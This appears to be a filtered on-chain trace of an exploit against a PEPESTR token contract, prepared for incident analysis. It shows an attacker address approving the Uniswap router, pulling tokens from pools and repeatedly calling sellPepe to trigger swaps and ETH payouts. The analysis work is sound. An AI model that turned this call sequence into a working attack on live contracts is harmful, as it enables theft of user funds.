# TRACE 调用时间线

> **过滤规则**: 只显示攻击者对外部合约的调用 + 受害者合约相关调用

      [127] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: approve(address,uint256)
            status=OK, gasUsed=24700, value=0
            args: spender:address=0x7a250d5630b4cf539739df2c5dacb4c659f2488d, amount:uint256=115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935
            returns: bool=True

        [128] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x37c5b33b176e8e1f96f6ab18e55f7588076a9dc3a07f3239b2b26d14b5c1b18e
              prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
              curr=0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff (115792089237316195423570985008687907853269984665640564039457584007913129639935)

        [184] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
              status=OK, gasUsed=2598, value=0
              args: account:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045
              returns: uint256=0

          [185] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [196] CALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transfer(address,uint256)
                status=OK, gasUsed=61237, value=0
                args: recipient:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, amount:uint256=498,164,804,028,113,414,588,264,283
                returns: bool=True

            [197] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000011
                  value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

            [198] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  value=0x000000000000000000000000000000000000000000004110a283633a79a05330 (307260679604265184940848)

            [199] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000f
                  value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

            [200] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000c
                  value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

            [201] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [202] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xde610423843eb8562fb81bd4fd442fc6941e37ba18c59f29a3fc944467eee171
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [203] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xe177c4ea682f7fc3faa20b837be764300ece9345212304703d4a6ec0587b51af
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [204] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                  value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

            [205] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000012
                  value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

            [206] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000013
                  value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

            [207] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000016
                  value=0x000000000000000000000000000000000000000000004110a283633a79a05330 (307260679604265184940848)

            [208] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000016
                  prev=0x000000000000000000000000000000000000000000004110a283633a79a05330 (307260679604265184940848)
                  curr=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)

            [209] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x000000000000000000000000000000000000000002182f73017d514563c6e6ca (648208312021035912161322698)

            [210] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  prev=0x000000000000000000000000000000000000000002182f73017d514563c6e6ca (648208312021035912161322698)
                  curr=0x000000000000000000000000000000000000000001eefa6631208d723220020e (598391831618224570702496270)

            [211] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  value=0x000000000000000000000000000000000000000000004110a283633a79a05330 (307260679604265184940848)

            [212] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  prev=0x000000000000000000000000000000000000000000004110a283633a79a05330 (307260679604265184940848)
                  curr=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)

            [214] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x000000000000000000000000000000000000000001eefa6631208d723220020e (598391831618224570702496270)

            [215] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  prev=0x000000000000000000000000000000000000000001eefa6631208d723220020e (598391831618224570702496270)
                  curr=0x0000000000000000000000000000000000000000007c1cf2ddddab057341f76f (150043507992922497573058415)

            [216] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [217] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                  curr=0x00000000000000000000000000000000000000000172dd735342e26cbede0a9f (448348323625302073129437855)

          [219] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                returns: uint256=150,043,507,992,922,497,573,058,415

            [220] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x0000000000000000000000000000000000000000007c1cf2ddddab057341f76f (150043507992922497573058415)

        [233] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
              status=OK, gasUsed=598, value=0
              args: account:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045
              returns: uint256=448,348,323,625,302,073,129,437,855

          [234] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                value=0x00000000000000000000000000000000000000000172dd735342e26cbede0a9f (448348323625302073129437855)

          [321] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: transfer(address,uint256)
                status=OK, gasUsed=36806, value=0
                args: recipient:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, amount:uint256=559,895,451,526,345,725,040,240,046,257
                returns: bool=True

          [331] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                status=OK, gasUsed=624, value=0
                args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=2,743,805,162,081,377,215,448,037,593,137

          [333] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                status=OK, gasUsed=534, value=0
                args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=7,357,331,599,001,236,529,451

            [411] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
                  status=OK, gasUsed=3262, value=0
                  args: dst:address=0x5f9b7e441e00373a83eee20f1366a7d32ec53d56, wad:uint256=6,189,330,984,939,294,868
                  returns: bool=True

            [417] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                  status=OK, gasUsed=624, value=0
                  args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=2,746,122,273,890,803,411,063,309,946,778

            [419] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                  status=OK, gasUsed=534, value=0
                  args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=7,351,142,268,016,297,234,583

          [501] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: transfer(address,uint256)
                status=OK, gasUsed=4106, value=0
                args: recipient:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, amount:uint256=43,977,465,419,499,361,191,837,514,604
                returns: bool=True

          [511] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                status=OK, gasUsed=624, value=0
                args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=2,702,144,808,471,304,049,871,472,432,174

          [513] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                status=OK, gasUsed=534, value=0
                args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=7,471,142,268,016,297,234,583

      [523] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: sellPepe(uint256)
            status=OK, gasUsed=152359, value=0
            args: orderId:uint256=8

        [524] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

        [525] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              prev=0x0000000000000000000000000000000000000000000000000000000000000001 (1)
              curr=0x0000000000000000000000000000000000000000000000000000000000000002 (2)

        [526] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538d
              value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [527] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538a
              value=0x00000000000000000000000000000000000000000000000047c4216d0b25f58c (5171295024350360972)

        [528] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538b
              value=0x0000000000000000000000000000000000000000076199dc130ff6293546e0a9 (2284387454981196851058237609)

        [529] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

        [530] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: getAmountsOut(uint256,address[])
              status=OK, gasUsed=4082, value=0
              args: amountIn:uint256=2,284,387,454,981,196,851,058,237,609, path:address[]=['0x6982508145454ce325ddbe47a25d4ec3d2311933', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2']
              returns: uint256[]=['2,284,387,454,981,196,851,058,237,609', '6,291,836,319,852,228,923']

            [533] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538b
                  value=0x0000000000000000000000000000000000000000076199dc130ff6293546e0a9 (2284387454981196851058237609)

        [534] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: balanceOf(address)
              status=OK, gasUsed=2624, value=0
              args: account:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91
              returns: uint256=4,971,048,924,300,494,930,062,512,536

          [536] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538b
                value=0x0000000000000000000000000000000000000000076199dc130ff6293546e0a9 (2284387454981196851058237609)

        [537] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: approve(address,uint256)
              status=OK, gasUsed=24729, value=0
              args: spender:address=0x7a250d5630b4cf539739df2c5dacb4c659f2488d, amount:uint256=2,284,387,454,981,196,851,058,237,609
              returns: bool=True

        [540] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

          [541] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538b
                value=0x0000000000000000000000000000000000000000076199dc130ff6293546e0a9 (2284387454981196851058237609)

        [542] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)
              status=OK, gasUsed=74159, value=0
              args: amountIn:uint256=2,284,387,454,981,196,851,058,237,609, amountOutMin:uint256=0, path:address[]=['0x6982508145454ce325ddbe47a25d4ec3d2311933', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', '0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91'], to:address=0x000000000000000000000000000000000000dead, deadline:uint256=1,767,358,691

          [556] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=2598, value=0
                args: account:address=0x000000000000000000000000000000000000dead
                returns: uint256=161,908,518,848,257,818,426,563,085

            [557] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                  value=0x00000000000000000000000000000000000000000085ed7664da88c66e1b5a0d (161908518848257818426563085)

            [568] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
                  status=OK, gasUsed=3262, value=0
                  args: dst:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, wad:uint256=6,291,836,319,852,228,923
                  returns: bool=True

            [574] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                  status=OK, gasUsed=624, value=0
                  args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=2,704,429,195,926,285,246,722,530,669,783

            [576] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                  status=OK, gasUsed=534, value=0
                  args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=7,464,850,431,696,445,005,660

            [593] CALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transfer(address,uint256)
                  status=OK, gasUsed=16173, value=0
                  args: recipient:address=0x000000000000000000000000000000000000dead, amount:uint256=66,873,000,451,532,696,492,459,691
                  returns: bool=True

              [594] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000011
                    value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

              [595] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    value=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)

              [596] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000f
                    value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

              [597] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000011
                    value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

              [598] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000c
                    value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

              [599] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                    value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

              [600] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000c
                    value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

              [601] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [602] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x43fedf50e12e5c047fbe3576d03ab50250348e9a6030f531ab6d4ce10f5b0303
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [603] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0xc73b1d6eda13a615b81c31830292dbbbf5fbb07f472982e223002bd83d5c3dc4
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [604] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                    value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

              [605] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000012
                    value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

              [606] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000013
                    value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

              [607] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000016
                    value=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)

              [608] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000016
                    prev=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)
                    curr=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)

              [609] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x0000000000000000000000000000000000000000007c1cf2ddddab057341f76f (150043507992922497573058415)

              [610] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    prev=0x0000000000000000000000000000000000000000007c1cf2ddddab057341f76f (150043507992922497573058415)
                    curr=0x0000000000000000000000000000000000000000007694db9ad502423ecdf05e (143356207947769227923812446)

              [611] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    value=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)

              [612] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    prev=0x00000000000000000000000000000000000000000029761d72e0270dab4737ec (50123741082415606643767276)
                    curr=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)

              [614] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x0000000000000000000000000000000000000000007694db9ad502423ecdf05e (143356207947769227923812446)

              [615] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    prev=0x0000000000000000000000000000000000000000007694db9ad502423ecdf05e (143356207947769227923812446)
                    curr=0x00000000000000000000000000000000000000000044cc0a3f87136566b9b0c4 (83170507541389801080598724)

              [616] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                    value=0x00000000000000000000000000000000000000000085ed7664da88c66e1b5a0d (161908518848257818426563085)

              [617] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                    prev=0x00000000000000000000000000000000000000000085ed7664da88c66e1b5a0d (161908518848257818426563085)
                    curr=0x000000000000000000000000000000000000000000b7b647c02877a3462f99a7 (222094219254637245269776807)

            [619] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                  status=OK, gasUsed=598, value=0
                  args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                  returns: uint256=83,170,507,541,389,801,080,598,724

              [620] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x00000000000000000000000000000000000000000044cc0a3f87136566b9b0c4 (83170507541389801080598724)

          [628] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0x000000000000000000000000000000000000dead
                returns: uint256=222,094,219,254,637,245,269,776,807

            [629] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                  value=0x000000000000000000000000000000000000000000b7b647c02877a3462f99a7 (222094219254637245269776807)

            [630] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538d
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [631] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xc7694af312c4f286114180fd0ba6a52461fcee8a381636770b19a343af92538d
                  prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                  curr=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

            [632] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000b
                  value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

        [633] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7f07e5...e4b045 :: <selector fallback>
              status=OK, gasUsed=40, value=0.01

          [634] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000006
                prev=0x0000000000000000000000000000000000000000000000000000000000000002 (2)
                curr=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

          [657] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: transfer(address,uint256)
                status=OK, gasUsed=4106, value=0
                args: recipient:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, amount:uint256=241,751,391,804,059,065,791,369,193,518
                returns: bool=True

          [667] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                status=OK, gasUsed=624, value=0
                args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=2,462,677,804,122,226,180,931,161,476,265

          [669] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                status=OK, gasUsed=534, value=0
                args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                returns: uint256=8,199,850,431,696,445,005,660

      [679] CALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: sellPepe(uint256)
            status=OK, gasUsed=130659, value=0
            args: orderId:uint256=5

        [680] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

        [681] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x0000000000000000000000000000000000000000000000000000000000000006
              prev=0x0000000000000000000000000000000000000000000000000000000000000001 (1)
              curr=0x0000000000000000000000000000000000000000000000000000000000000002 (2)

        [682] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4f
              value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [683] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4c
              value=0x00000000000000000000000000000000000000000000000066f0216e3929ab8d (7417465343568358285)

        [684] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4d
              value=0x000000000000000000000000000000000000000008ae5a9014d493e109cbb0ef (2686660841999298079004274927)

        [685] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

        [686] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: getAmountsOut(uint256,address[])
              status=OK, gasUsed=4082, value=0
              args: amountIn:uint256=2,686,660,841,999,298,079,004,274,927, path:address[]=['0x6982508145454ce325ddbe47a25d4ec3d2311933', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2']
              returns: uint256[]=['2,686,660,841,999,298,079,004,274,927', '8,909,107,977,050,340,696']

            [689] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4d
                  value=0x000000000000000000000000000000000000000008ae5a9014d493e109cbb0ef (2686660841999298079004274927)

        [690] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: balanceOf(address)
              status=OK, gasUsed=624, value=0
              args: account:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91
              returns: uint256=2,686,661,469,319,298,079,004,274,927

          [692] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4d
                value=0x000000000000000000000000000000000000000008ae5a9014d493e109cbb0ef (2686660841999298079004274927)

